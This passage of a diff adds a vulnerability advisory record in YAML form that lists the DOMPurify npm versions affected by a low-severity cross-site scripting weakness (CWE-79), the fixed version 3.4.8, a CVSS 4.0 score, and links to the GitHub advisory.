+      - pkg:npm/dompurify@3.0.3
+      - pkg:npm/dompurify@3.0.4
+      - pkg:npm/dompurify@3.0.5
+      - pkg:npm/dompurify@3.0.6
+      - pkg:npm/dompurify@3.0.7
+      - pkg:npm/dompurify@3.0.8
+      - pkg:npm/dompurify@3.0.9
+      - pkg:npm/dompurify@3.0.10
+      - pkg:npm/dompurify@3.0.11
+      - pkg:npm/dompurify@3.1.0
+      - pkg:npm/dompurify@3.1.1
+      - pkg:npm/dompurify@3.1.2
+      - pkg:npm/dompurify@3.1.3
+      - pkg:npm/dompurify@3.1.4
+      - pkg:npm/dompurify@3.1.5
+      - pkg:npm/dompurify@3.1.6
+      - pkg:npm/dompurify@3.1.7
+      - pkg:npm/dompurify@3.2.0
+      - pkg:npm/dompurify@3.2.1
+      - pkg:npm/dompurify@3.2.2
+      - pkg:npm/dompurify@3.2.3
+      - pkg:npm/dompurify@3.2.4
+      - pkg:npm/dompurify@3.2.5
+      - pkg:npm/dompurify@3.2.6
+      - pkg:npm/dompurify@3.2.7
+      - pkg:npm/dompurify@3.3.0
+      - pkg:npm/dompurify@3.3.1
+      - pkg:npm/dompurify@3.3.2
+      - pkg:npm/dompurify@3.3.3
+      - pkg:npm/dompurify@3.4.0
+      - pkg:npm/dompurify@3.4.1
+      - pkg:npm/dompurify@3.4.2
+      - pkg:npm/dompurify@3.4.3
+      - pkg:npm/dompurify@3.4.4
+      - pkg:npm/dompurify@3.4.5
+      - pkg:npm/dompurify@3.4.6
+      - pkg:npm/dompurify@3.4.7
+    fixed_packages:
+      - pkg:npm/dompurify@3.4.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '2.0'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-gvmj-g25r-r7wr/GHSA-gvmj-g25r-r7wr.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/cure53/DOMPurify
+    reference_type:
+    reference_id:
+  - url: https://github.com/cure53/DOMPurify/security/advisories/GHSA-gvmj-g25r-r7wr
+    reference_type:
+    reference_id:
+exploits: []
